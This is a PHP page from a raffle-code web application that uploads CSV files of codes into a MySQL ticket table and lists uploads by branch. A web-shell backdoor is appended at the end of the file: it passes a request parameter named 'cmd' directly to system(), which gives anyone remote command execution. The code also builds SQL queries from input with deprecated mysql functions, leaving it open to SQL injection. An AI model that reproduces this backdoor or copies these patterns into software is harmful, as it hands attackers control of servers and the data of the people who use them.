<?php
	$ulupload_csv = 'N';
	if(isset($_SESSION['ulupload_csv']))
		if ($_SESSION['ulupload_csv'] == 'Y')
			$ulupload_csv = $_SESSION['ulupload_csv'];		

	$uladmin = 'N';
	if(isset($_SESSION['uladmin']))
		$uladmin = $_SESSION['uladmin'];	

	if ($uladmin == 'Y')
		$ulupload_csv = 'Y';	
		
		
	$mystatus = '';	
	if(isset($_GET['mystatus']))
	{
		if ($_GET['mystatus'])
		{
			$mystatus = $_GET['mystatus'];
		}
	}
	//echo '<br> mystatus : ' . $mystatus;
	
	$mybox = '';	
	if(isset($_GET['mybox']))
	{
		if ($_GET['mybox'])
		{
			$mybox = $_GET['mybox'];
		}
	}
	//echo '<br> mybox : ' . $mybox;
	

	if ($mybox != 'add')
	{
		$ulupload_csv = 'N';
	}	


	if ($ulupload_csv == 'N')
	{
		include('body_account_not_found.php');
	}
	else
	{
		
		/*LOG-IN FORM*/
	 	if ($_SESSION['logupload_csv'] == '') 
		{
			$_SESSION['logupload_csv'] = $_SESSION["ulname"];
			$modulename = 'upload_csv';
			$updatedby = $_SESSION["ulname"];
			$logdate = $globaldate;
			$logstamp = $globaldatetime;
			$logtype = 'LOG-IN';
			$query = "INSERT INTO user_log (logdate, logform, logtype, loguser, logstamp) 
					  VALUES ('$logdate', '$modulename', '$logtype', '$updatedby', '$logstamp')";
			mysql_query($query) or die(mysql_error());   	
		}
		/*LOG-IN FORM*/			
		
		$computer_user = $_SESSION["ulname"];
		$computer_stamp = $globaldatetime;

		$tlcontact = '';	
		if(isset($_POST['tlcontact']))
		{
			if ($_POST['tlcontact'])
			{
				$tlcontact = $_POST['tlcontact'];
			}
		}			

		$mytag = '';	
		if(isset($_GET['mytag']))
		{
			if ($_GET['mytag'])
			{
				$mytag = $_GET['mytag'];
			}
		}			

		if (($mytag != 'POST') && ($mytag != 'BULK')) 
		{	
?>	
        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <h1 class="page-header">Generate Raffle Code</h1>
                </div>
                <!-- /.col-lg-12 -->
            </div>
			
			<div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
This module creates new raffle codes based on the number of raffles codes that you need
                        </div>
						
                        <div class="panel-body">
                            <div class="row">
                                <div class="col-lg-6">
<form name="import" method="post" enctype="multipart/form-data" action="index.php?body=upload_csv_dbase&mybox=add&mytag=POST">
	<div class="form-group">
		<label>Choose CSV File </label>
		<input class="form-control" type="file" name="file" accept=".csv, application/vnd.openxmlformats-officedocument.spreadsheetml.sheet, application/vnd.ms-excel" />
		<br>
		<button type="submit" class="btn btn-default">Upload File</button>
		<button type="reset" class="btn btn-default">Reset</button>
	</div>
	
	<div class="form-group">
		<label>User Name / Time Stamp </label>
		<br>
		<?php print ("$computer_user"); ?>
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
		<?php print ("$computer_stamp"); ?>
	</div>
</form>		
								</div>
							</div>
						</div>
					</div>

					<div class="panel panel-default">
                        <div class="panel-heading">
CSV Data Contents
                        </div>
						
                        <div class="panel-body">
                            <div class="table-responsive">
                                <table class="table table-striped table-bordered table-hover">
                                    <thead>
                                        <tr>
                                            <th>#</th>
                                            <th>Field</th>
                                            <th>Sample Data</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <tr>
                                            <td>1</td>
                                            <td>Raffle Code</td>
                                            <td>1234567890</td>
                                        </tr>
                                    </tbody>
                                </table>
                            </div>
                            <!-- /.table-responsive -->
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
						
					<div class="panel panel-default">
                        <div class="panel-heading">
Uploaded Data
                        </div>
						
                        <div class="panel-body">
                            <div class="table-responsive">
                                <table class="table table-striped table-bordered table-hover" id="dataTables-example">
                                    <thead>
                                        <tr>
                                            <th>#</th>
                                            <th>Date Uploaded</th>
                                            <th>Branch Uploaded</th>
                                            <th>Raffle Code Count</th>
                                        </tr>
                                    </thead>
                                    <tbody>

<?php
	$querydb  = "SELECT 
				 count(a.tlid) tlcount,
				 a.tldate, a.tlbranch
			   FROM 
				 ticket_list a
			   WHERE
			     tldate = '$globaldate'
			   GROUP BY
				 a.tldate, a.tlbranch
			   ORDER BY 
				 a.tldate, a.tlbranch ";
	$resultdb = mysql_query($querydb);
	//echo mysql_error();
	$num_count = mysql_num_rows($resultdb);		
	//echo "<br> num_count " . $num_count;
	
	//fetch the results from the database
	$countdb = $countdb + 1;
	while ($rowdb =  mysql_fetch_array ($resultdb)) 
	{
		print("<tr class=\"odd gradeX\">");
	
		print("<td align=\"center\" valign=\"middle\">$countdb </td>\n");
		print("<td align=\"center\" valign=\"middle\">" .date('m/d/Y', strtotime($rowdb['tldate'])). "</td>\n");
		print("<td align=\"center\" valign=\"middle\">$rowdb[tlbranch]</td>\n");
		print("<td align=\"center\" valign=\"middle\">" . number_format($rowdb[tlcount],0) . "</td>\n");

		print("</tr>");  
		$countdb = $countdb + 1;
	}  
?>		


                                    </tbody>
                                </table>
                            </div>
                            <!-- /.table-responsive -->
                        </div>
                        <!-- /.panel-body -->						
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-6 -->
            </div>
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->
<?php
		}
		else
		if ($mytag == 'POST') 
		{
			$tlbatch = $globaldatetime;
?>
		 <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
							<table width="100%">
								<tr>
									<td align="left">
                    <h1 class="page-header">Upload CSV (Processing records ...)</h1>
									</td>
									<td align="right">
<a title="Add a new batch?" href="index.php?body=upload_csv_dbase&mybox=add">
Upload Another Batch?
</a>
									</td>
								</tr>
							</table>
											
                </div>
                <!-- /.col-lg-12 -->
            </div>
						
			<div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
Basic Information
                        </div>
						
                        <div class="panel-body">
                            <div class="table-responsive">
                                <table class="table table-striped table-bordered table-hover">
                                    <thead>
                                        <tr>
                                            <th>#</th>
                                            <th>Raffle Code</th>
                                            <th>Status</th>
                                        </tr>
                                    </thead>
                                    <tbody>
<?php                                        	
	$file = $_FILES['file']['tmp_name'];
	if ($file == '')
	{
		print("<tr>\n");
		print("<td>***</td>\n");
		print("<td>***</td>\n");
		print("<td>*** NO FILE UPLOADED</td>\n");
		print("</TR>\n");  	
	}
	else
	{		
		$handle = fopen($file, "r");
		$mycount = 0;
		$loopcount = 0;
		while(($filesop = fgetcsv($handle, 1000, ",")) !== false)
		{
	
			//skip the first line				
			if ($loopcount > 0)
			{
				$mystring = $filesop[0];
				$mystring = str_replace("'", "&rsquo;", $mystring);
				$tlticket = $mystring;
		
				$tlbranch = $_SESSION["ulbranch"];
				$tlactive = 'Y';
				$tluser = $_SESSION["ulname"];
				$tlstamp = $globaldatetime;
				
				if ($tlticket == '') 
				{
					print("<tr>\n");
					print("<td>&nbsp; $loopcount </td>\n");
					print("<td>$tlticket</td>\n");
					print("<td>*** MISSING INFO</td>\n");
					print("</TR>\n");  				
				}
				else
				{
					$tlid = 0;
					$query = " SELECT *
							   FROM ticket_list 
							   WHERE tlticket='$tlticket' ";
					$result = mysql_query($query);
					echo mysql_error();				
					while ($row =  mysql_fetch_array ($result)) 
					{					
						$tlid = $row[tlid];
						$tlactive = $row[tlactive];
					}	
					
					if ($tlid == 0)
					{
						//echo '<br> ADD MODE ' . $slid;		
						$status = 'ADD';
						
						$tldate = $globaldate;
						$tltaken_swipe = 0;

		
						$query =  "INSERT INTO ticket_list (
tlid,
tldate,
tlbatch,
tlbranch,
tlticket,

tlactive,
tluser,
tlstamp
						) 
						VALUES 
						(
'$tlid',
'$tldate',
'$tlbatch',
'$tlbranch',
'$tlticket',

'$tlactive',
'$tluser',
'$tlstamp'
						)";						
						mysql_query($query) or die(mysql_error());   
						$mycount = $mycount + 1;
											
					}
					else
					if ($tlid != 0)
					{
						//echo '<br> EDIT MODE ' . $slid;	
						$status = 'PROMO CODE EXISTS';					
		
/*		
						$status = 'EDIT';					
						
						$query = 
						"UPDATE 
ticket_list 
						SET 
tlbatch = '$tlbatch',
tlsequence = '$tlsequence',
tlcustomer = '$tlcustomer',
tlcontact = '$tlcontact',
tltransid = '$tltransid',
tlticket = '$tlticket',
tlsection = '$tlsection',
tlbranch = '$tlbranch',
tltransdate = '$tltransdate',
tlpayment = '$tlpayment',

tlactive = '$tlactive',
tluser = '$tluser',
tlstamp = '$tlstamp'		
						WHERE 
tlid = '$tlid'; ";						
						mysql_query($query) or die(mysql_error());   
						$mycount = $mycount + 1;
*/						
					}
					
					print("<tr class=\"odd gradeX\">");
					print("<td>&nbsp; $loopcount </td>\n");
					print("<td>$tlticket</td>\n");
					print("<td>$status</td>\n");
					print("</TR>\n");  	
															
				}
			}
			
			$loopcount = $loopcount + 1;
		}
	}						
?>												
                                    </tbody>
                                </table>
                            </div>
                            <!-- /.table-responsive -->
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-6 -->
            </div>
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->
<?php
		}
	}
?>			<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>